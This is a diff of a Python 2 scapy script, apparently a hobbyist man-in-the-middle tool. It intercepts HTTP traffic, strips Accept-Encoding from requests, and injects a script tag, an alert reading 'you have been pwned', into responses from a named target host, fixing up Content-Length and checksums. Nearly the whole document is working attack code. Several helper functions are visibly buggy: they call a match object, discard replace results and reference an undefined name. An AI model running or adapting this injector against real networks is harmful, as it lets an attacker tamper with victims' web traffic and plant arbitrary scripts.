@@ -7,6 +7,18 @@ import subprocess
 from scapy.layers import http
 import re
 import zlib
+import linecache
+
+# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number
+
+def PrintException():
+    exc_type, exc_obj, tb = sys.exc_info()
+    f = tb.tb_frame
+    lineno = tb.tb_lineno
+    filename = f.f_code.co_filename
+    linecache.checkcache(filename)
+    line = linecache.getline(filename, lineno, f.f_globals)
+    print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)
 
 
 def run():
@@ -34,49 +46,88 @@ def reset_iptables():
 	subprocess.call(["iptables", "--flush"])
 
 def intercept_packets(packet):
-	target_host = "tachibanalaboratories"
-	alert_message = "you have been pwned"
+	try:
+		target_host = "tachibanalaboratories"
+		alert_message = "you have been pwned"
+		payload = "<body><script>alert(\'you have been pwned\');</script>"
 
-	scapy_packet = scapy.IP(packet.get_payload())
+		scapy_packet = scapy.IP(packet.get_payload())
 
-	if (scapy_packet.haslayer(http.HTTPRequest)):
-	   # print(scapy_packet.show())
-	   	http_request = scapy_packet[http.HTTPRequest]
-		if scapy_packet[scapy.TCP].dport == 80:
-			http_request.Accept_Encoding = "" #this field should be able to be toggled or something
-			new_packet = set_http(scapy_packet, http_request)
-			packet.set_payload(str(new_packet))
-			
-			print("req")
+		if (scapy_packet.haslayer(http.HTTPRequest)):
+		   # print(scapy_packet.show())
+		   	http_request = scapy_packet[http.HTTPRequest]
+			if scapy_packet[scapy.TCP].dport == 80:
+				http_request.Accept_Encoding = "" #this field should be able to be toggled or something
+				new_packet = set_http(scapy_packet, http_request)
+				packet.set_payload(str(new_packet))
+				
+				print("req")
 
-	elif (scapy_packet.haslayer(scapy.Raw)):
-		load = scapy_packet[scapy.Raw].load
+		elif (scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
+			load = scapy_packet[scapy.Raw].load
 
-		if (scapy_packet[scapy.TCP].sport == 80):
-			load = inject_code_reply(load)
-			new_packet = set_load(scapy_packet, load)
-			packet.set_payload(str(new_packet))
-			new_packet[scapy.IP].show()
-			print("pwn")
+			if (scapy_packet[scapy.TCP].sport == 80):
+				new_packet = set_load(scapy_packet, load, payload)
+				packet.set_payload(str(new_packet))
+				#new_packet[scapy.IP].show()
+				print(new_packet[http.HTTPResponse].Content_Length)
+				print("pwn")
+	except:
+		PrintException()
 	
 	packet.accept()
 	
+#### REQUIRED FOR SOME VERSIONS OF SCAPY ####
+def get_raw_response_content_length(load):
+	content_length_re = re.search("(?:Content-Length:\s)(\d*)", load)
+	if content_length_re:
+		content_length  = content_length_re(1)
+		return content_length
 
+def set_raw_response_content_length(load, payload):
+	payload_length = len(payload)
+	content_length = get_response_content_length(load)
+	try:
+		if content_length:
+			new_content_length = payload_length + content_length
+			load.replace(content_length, new_content_length)
+			return load
+	except AttributeError:
+		print("something has resulted in a None type")
+		print(" payload length: ", payload_length)
+		print("content length: ", content_length)
 
-def inject_code_reply(load):
-	return load.replace("<body>", "<body><script>alert(\'you have been pwned\');</script>")
+#############################################
 
-
+## trying to figure out a way to recompress the raw layer before forwarding it on to the target but mode -1 is wrong
+## need to get this working to avoid the need to fragment packets
 def gzip_load(load):
 	return zlib.compress(load)
 
-def set_load(packet, load):
-	compressed_load = gzip_load(load)
-	packet[scapy.Raw].load = compressed_load
-	del packet[scapy.IP].len
-	del packet[scapy.IP].chksum
-	del packet[scapy.TCP].chksum
-	return packet
+def set_response_header_value_content_length(packet, payload):
+		content_length =  packet[http.HTTPResponse].Content_Length
+		payload_length  = len(payload)
+		new_content_length = int(content_length) + payload_length
+		del packet[http.HTTPResponse].Content_Length
+		packet[http.HTTPResponse].Content_Length = new_content_length
+		return packet
+
+def set_load(packet, load, payload):
+	try:
+		#compressed_load = gzip_load(load)
+		#load = set_response_content_length(load, payload)
+		packet = set_response_header_value_content_length(packet, payload)
+		#inject payload into raw layer
+
+		load.replace("<body>", payload)
+		packet[scapy.Raw].load = load
+		del packet[scapy.IP].len
+		del packet[scapy.IP].chksum
+		del packet[scapy.TCP].chksum
+		return packet
+	except:
+		print("packet type:", type(packet))
+		PrintException()
 
 def set_http(packet, http_layer):
 	del packet[scapy.IP].len
